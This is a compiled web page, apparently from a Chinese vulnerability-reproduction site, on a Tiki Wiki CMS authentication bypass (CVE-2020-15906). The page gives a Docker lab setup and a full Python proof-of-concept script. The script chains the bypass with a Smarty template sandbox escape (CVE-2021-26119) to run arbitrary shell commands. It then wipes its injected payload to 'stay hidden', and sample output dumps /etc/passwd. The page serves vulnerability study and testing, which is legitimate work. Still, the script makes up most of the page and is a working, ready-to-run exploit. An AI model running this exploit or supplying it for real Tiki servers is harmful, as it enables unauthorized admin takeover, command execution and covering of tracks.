import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c,a as n,b as s,d as t,e}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"Tiki Wiki CMS Groupware或简称为Tiki（最初称为TikiWiki）是一种免费且开源的基于Wiki的内容管理系统和在线办公套件。在如下这些版本21.2, 20.4, 19.3, 18.7, 17.3, 16.4前存在一处逻辑错误，管理员账户被爆破60次以上时将被锁定，此时使用空白密码即可以管理员身份登录后台。",-1),d=n("p",null,"参考链接：",-1),k={href:"https://info.tiki.org/article473-Security-Releases-of-all-Tiki-versions-since-16-3",target:"_blank",rel:"noopener noreferrer"},v={href:"https://github.com/S1lkys/CVE-2020-15906",target:"_blank",rel:"noopener noreferrer"},m={href:"http://packetstormsecurity.com/files/159663/Tiki-Wiki-CMS-Groupware-21.1-Authentication-Bypass.html",target:"_blank",rel:"noopener noreferrer"},b={href:"https://srcincite.io/pocs/cve-2021-26119.py.txt",target:"_blank",rel:"noopener noreferrer"},g=e(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个Tiki Wiki CMS 21.1：</p><blockquote><p>需要通过<code>dos2unix docker-entrypoint.sh</code>命令将其转换成为unix格式文件。</p></blockquote><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080/tiki-login_scr.php</code>可以看到其欢迎页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,6),h={href:"https://srcincite.io/pocs/cve-2021-26119.py.txt%E4%B8%AD%E7%9A%84%5BPOC%5D(https://github.com/vulhub/vulhub/blob/master/tikiwiki/CVE-2020-15906/poc.py)%E8%BF%9B%E8%A1%8C%E5%A4%8D%E7%8E%B0%E3%80%82%E8%AF%A5POC%E5%85%88%E4%BD%BF%E7%94%A8CVE-2020-15906%E7%BB%95%E8%BF%87%E8%AE%A4%E8%AF%81%EF%BC%8C%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%EF%BC%9B%E5%86%8D%E4%BD%BF%E7%94%A8Smarty%E7%9A%84%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-26119%EF%BC%89%E4%BA%8E%E5%90%8E%E5%8F%B0%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%EF%BC%9A",target:"_blank",rel:"noopener noreferrer"},y=e(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python poc.py your-ip:8080 / id
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021538346.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>注意，受到漏洞原理的影响，执行该POC会导致管理员账户被锁定。</p><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token triple-quoted-string string">&quot;&quot;&quot;
Tiki Wiki CMS GroupWare Serverside Template Injection Remote Code Execution Vulnerability
This is a demonstration of CVE-2021-26119 (Smarty Template Engine template_object Sandbox Escape PHP Code Injection)
Written by: Steven Seeley of Qihoo 360 Vulcan Team
Exploit tested against: Tiki Wiki 20.3 (Tarazed)

Bug 1: CVE-2020-15906
    - An unauthenticated user can bypass the authentication by bruteforcing the admin account &gt; 50 times and login with a blank password
    - Works on: &lt;= 21.1 (UY_Scuti)
    
Bug 2: CVE-2021-26119 
    - An admin user can trigger a serverside template injection and gain remote code execution by escaping the sandbox of the Smarty Template Engine by leveraging the &#39;template_object&#39; property
    - Works on: &lt;= 22.2 (Corona_Borealis) and impacts Smarty &lt;= 3.1.38 (latest)

# Notes

- *WARNING* This exploit will lock out the administrator account
- It was possible in older versions of Tiki Wiki (including 20.3) that you could:

  1. Edit Smarty templates with a user that had the &#39;tiki_p_edit_templates&#39; privilege, but Tiki clued into this and has since disabled this &#39;feature&#39; by default, see using [Risky preferences](https://doc.tiki.org/Risky-Preferences)
  2. Disable the Smarty sandbox entirely by unchecking the &quot;Smarty Security&quot; checkbox in the general security tab which is no longer possible.

  However it&#39;s still possible for an admin (or user with the &#39;tiki_p_admin&#39; permission assigned) to add Smarty template syntax to the &#39;feature_custom_html_head_content&#39; option under [Customization](http://doc.tiki.org/Customization) in the [Look and Feel](http://doc.tiki.org/Look-and-Feel) control panel menu. This is enough for attackers to escape the Smarty sandbox leveraging either CVE-2021-26119 or CVE-2021-26120 and execute arbitrary remote code.

# Example

researcher@incite:~/tiki$ ./poc.py
(+) usage: ./poc.py &lt;host&gt; &lt;path&gt; &lt;cmd&gt;
(+) eg: ./poc.py 192.168.75.141 / id
(+) eg: ./poc.py 192.168.75.141 /tiki-20.3/ id

researcher@incite:~/tiki$ ./poc.py 192.168.75.141 /tiki-20.3/ &quot;id;uname -a;pwd;head /etc/passwd&quot;
(+) blanking password...
(+) admin password blanked!
(+) getting a session...
(+) auth bypass successful!
(+) triggering rce...

uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux target 5.8.0-40-generic #45-Ubuntu SMP Fri Jan 15 11:05:36 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
/var/www/html/tiki-20.3
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin

# References

- Maximilian Barz&#39;s poc at https://github.com/S1lkys/CVE-2020-15906
&quot;&quot;&quot;</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> re

<span class="token keyword">def</span> <span class="token function">auth_bypass</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> t<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">:</span>
    h <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">&quot;referer&quot;</span> <span class="token punctuation">:</span> t <span class="token punctuation">}</span>
    d<span class="token punctuation">[</span><span class="token string">&quot;ticket&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> get_ticket<span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">&quot;%stiki-login.php&quot;</span> <span class="token operator">%</span> t<span class="token punctuation">)</span>
    d<span class="token punctuation">[</span><span class="token string">&quot;pass&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;&quot;</span> <span class="token comment"># auth bypass is here</span>
    r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">&quot;%stiki-login.php&quot;</span> <span class="token operator">%</span> t<span class="token punctuation">,</span> data<span class="token operator">=</span>d<span class="token punctuation">,</span> headers<span class="token operator">=</span>h<span class="token punctuation">)</span>
    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;%stiki-admin.php&quot;</span> <span class="token operator">%</span> t<span class="token punctuation">)</span>
    <span class="token keyword">assert</span> <span class="token punctuation">(</span><span class="token string">&quot;You do not have the permission that is needed&quot;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;(-) authentication bypass failed!&quot;</span>

<span class="token keyword">def</span> <span class="token function">black_password</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> t<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">:</span>
    uri <span class="token operator">=</span> <span class="token string">&quot;%stiki-login.php&quot;</span> <span class="token operator">%</span> t
    <span class="token comment"># setup cookies here</span>
    s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>uri<span class="token punctuation">)</span>
    ticket <span class="token operator">=</span> get_ticket<span class="token punctuation">(</span>s<span class="token punctuation">,</span> uri<span class="token punctuation">)</span>
    <span class="token comment"># crafted especially so unsuccessful_logins isn&#39;t recorded</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>uri<span class="token punctuation">,</span> d<span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">&quot;Account requires administrator approval.&quot;</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;(+) admin password blanked!&quot;</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>
    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">&quot;(-) auth bypass failed!&quot;</span><span class="token punctuation">)</span> 

<span class="token keyword">def</span> <span class="token function">get_ticket</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> uri<span class="token punctuation">)</span><span class="token punctuation">:</span>
    h <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">&quot;referer&quot;</span> <span class="token punctuation">:</span> uri <span class="token punctuation">}</span>
    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>uri<span class="token punctuation">)</span>
    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">&#39;class=&quot;ticket&quot; name=&quot;ticket&quot; value=&quot;(.*)&quot; \\/&gt;&#39;</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">assert</span> <span class="token keyword">match</span><span class="token punctuation">,</span> <span class="token string">&quot;(-) csrf ticket leak failed!&quot;</span>
    <span class="token keyword">return</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">trigger_or_patch_ssti</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> t<span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># CVE-2021-26119</span>
    p <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">&quot;page&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;look&quot;</span> <span class="token punctuation">}</span>
    h <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">&quot;referer&quot;</span> <span class="token punctuation">:</span> t <span class="token punctuation">}</span>
    bypass <span class="token operator">=</span> <span class="token string">&quot;startrce{$smarty.template_object-&gt;smarty-&gt;disableSecurity()-&gt;display(&#39;string:{shell_exec(\\&quot;%s\\&quot;)}&#39;)}endrce&quot;</span> <span class="token operator">%</span> c
    d <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;ticket&quot;</span> <span class="token punctuation">:</span> get_ticket<span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">&quot;%stiki-admin.php&quot;</span> <span class="token operator">%</span> t<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">&quot;feature_custom_html_head_content&quot;</span> <span class="token punctuation">:</span> bypass <span class="token keyword">if</span> c <span class="token keyword">else</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;lm_preference[]&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;feature_custom_html_head_content&quot;</span>
    <span class="token punctuation">}</span>
    r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">&quot;%stiki-admin.php&quot;</span> <span class="token operator">%</span> t<span class="token punctuation">,</span> params<span class="token operator">=</span>p<span class="token punctuation">,</span> data<span class="token operator">=</span>d<span class="token punctuation">,</span> headers<span class="token operator">=</span>h<span class="token punctuation">)</span>
    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;%stiki-index.php&quot;</span> <span class="token operator">%</span> t<span class="token punctuation">)</span>
    <span class="token keyword">if</span> c <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">assert</span> <span class="token punctuation">(</span><span class="token string">&quot;startrce&quot;</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text <span class="token keyword">and</span> <span class="token string">&quot;endrce&quot;</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;(-) rce failed!&quot;</span>
        cmdr <span class="token operator">=</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;startrce&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;endrce&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>cmdr<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;(+) usage: %s &lt;host&gt; &lt;path&gt; &lt;cmd&gt;&quot;</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;(+) eg: %s 192.168.75.141 / id&quot;</span><span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;(+) eg: %s 192.168.75.141 /tiki-20.3/ id&quot;</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    p <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
    c <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
    p <span class="token operator">=</span> p <span class="token operator">+</span> <span class="token string">&quot;/&quot;</span> <span class="token keyword">if</span> <span class="token keyword">not</span> p<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span> <span class="token keyword">else</span> p
    p <span class="token operator">=</span> <span class="token string">&quot;/&quot;</span> <span class="token operator">+</span> p <span class="token keyword">if</span> <span class="token keyword">not</span> p<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span> <span class="token keyword">else</span> p
    t <span class="token operator">=</span> <span class="token string">&quot;http://%s%s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;(+) blanking password...&quot;</span><span class="token punctuation">)</span>
    d <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;user&#39;</span><span class="token punctuation">:</span><span class="token string">&#39;admin&#39;</span><span class="token punctuation">,</span> 
        <span class="token string">&#39;pass&#39;</span><span class="token punctuation">:</span><span class="token string">&#39;trololololol&#39;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    black_password<span class="token punctuation">(</span>s<span class="token punctuation">,</span> t<span class="token punctuation">,</span> d<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;(+) getting a session...&quot;</span><span class="token punctuation">)</span>
    auth_bypass<span class="token punctuation">(</span>s<span class="token punctuation">,</span> t<span class="token punctuation">,</span> d<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;(+) auth bypass successful!&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;(+) triggering rce...\\n&quot;</span><span class="token punctuation">)</span>
    <span class="token comment"># trigger for rce</span>
    trigger_or_patch_ssti<span class="token punctuation">(</span>s<span class="token punctuation">,</span> t<span class="token punctuation">,</span> c<span class="token punctuation">)</span>
    <span class="token comment"># patch so we stay hidden</span>
    trigger_or_patch_ssti<span class="token punctuation">(</span>s<span class="token punctuation">,</span> t<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,5);function q(_,w){const a=o("ExternalLinkIcon");return i(),c("div",null,[u,r,d,n("ul",null,[n("li",null,[n("a",k,[s("https://info.tiki.org/article473-Security-Releases-of-all-Tiki-versions-since-16-3"),t(a)])]),n("li",null,[n("a",v,[s("https://github.com/S1lkys/CVE-2020-15906"),t(a)])]),n("li",null,[n("a",m,[s("http://packetstormsecurity.com/files/159663/Tiki-Wiki-CMS-Groupware-21.1-Authentication-Bypass.html"),t(a)])]),n("li",null,[n("a",b,[s("https://srcincite.io/pocs/cve-2021-26119.py.txt"),t(a)])])]),g,n("p",null,[s("我们可以使用"),n("a",h,[s("https://srcincite.io/pocs/cve-2021-26119.py.txt中的[POC](https://github.com/vulhub/vulhub/blob/master/tikiwiki/CVE-2020-15906/poc.py)进行复现。该POC先使用CVE-2020-15906绕过认证，获取管理员权限；再使用Smarty的沙盒绕过漏洞（CVE-2021-26119）于后台执行任意命令："),t(a)])]),y])}const x=p(l,[["render",q],["__file","Tiki Wiki CMS Groupware 认证绕过漏洞 CVE-2020-15906.html.vue"]]);export{x as default};
